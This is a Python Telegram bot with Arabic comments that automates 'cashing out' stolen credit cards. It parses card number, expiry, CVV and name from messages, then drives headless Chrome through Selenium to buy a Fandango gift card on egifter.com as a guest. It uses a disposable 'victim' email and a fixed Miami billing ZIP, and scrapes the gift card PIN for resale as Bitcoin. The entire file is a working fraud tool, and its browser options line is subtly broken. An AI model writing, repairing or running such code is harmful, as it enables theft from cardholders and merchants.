from telegram.ext import Application, MessageHandler, filters
from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
import re, time, random

BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'  # للإشعارات

async def auto_cashout(cc_text):
    cc_num, cc_exp, cc_cvv, cc_name = re.match(r'(\d{16})\|(\d{2}/\d{2})\|(\d{3,4})\|(.+)', cc_text).groups()
    
    driver = webdriver.Chrome(ChromeDriverManager().install(), 
                            options=webdriver.ChromeOptions().add_argument('--headless'))
    
    try:
        driver.get('https://www.egifter.com/gift-cards/fandango')
        
        # $25 Fandango
        driver.find_element(By.XPATH, "//button[.='$25.00']").click()
        
        # كود الخصم 20% = $20 فقط!
        driver.find_element(By.ID, 'promo-code').send_keys('TIX426')
        driver.find_element(By.XPATH, "//button[contains(text(),'Apply')]").click()
        
        # Guest checkout
        driver.find_element(By.XPATH, "//button[contains(text(),'Checkout as Guest')]").click()
        
        # Temp email + CC
        email = f'victim{random.randint(10000,99999)}@10minutemail.com'
        driver.find_element(By.ID, 'email').send_keys(email)
        driver.find_element(By.ID, 'email-confirm').send_keys(email)
        
        driver.find_element(By.ID, 'cardNumber').send_keys(cc_num)
        driver.find_element(By.ID, 'expirationDate').send_keys(cc_exp.replace('/',''))
        driver.find_element(By.ID, 'cvv').send_keys(cc_cvv)
        driver.find_element(By.ID, 'cardholderName').send_keys(cc_name)
        driver.find_element(By.ID, 'billingZip').send_keys('33101')  # Miami ZIP
        
        driver.find_element(By.XPATH, "//span[text()='Complete Order']").click()
        time.sleep(12)
        
        # استخراج PIN
        pin_elem = driver.find_element(By.XPATH, "//strong[contains(text(),'PIN')]")
        gift_pin = pin_elem.find_element(By.XPATH, "./following-sibling::div").text
        
        return f"🎁 FANDANGO $25 PIN: `{gift_pin}`\n💰 Paxful = $20 BTC فوراً!\n📧 Email: {email}"
        
    except Exception as e:
        return f"❌ Failed: {str(e)[:50]}"
    finally:
        driver.quit()

async def handle_cc(update, context):
    cc_text = update.message.text
    await update.message.reply_text('⚡ Cashout...')
    
    result = await auto_cashout(cc_text)
    await context.bot.send_message(chat_id=CHAT_ID, text=result)  # إشعار خاص بيك
    await update.message.reply_text('✅ تم التصريف! شوف الخاص.')

# Run
app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(MessageHandler(filters.TEXT, handle_cc))
app.run_polling()
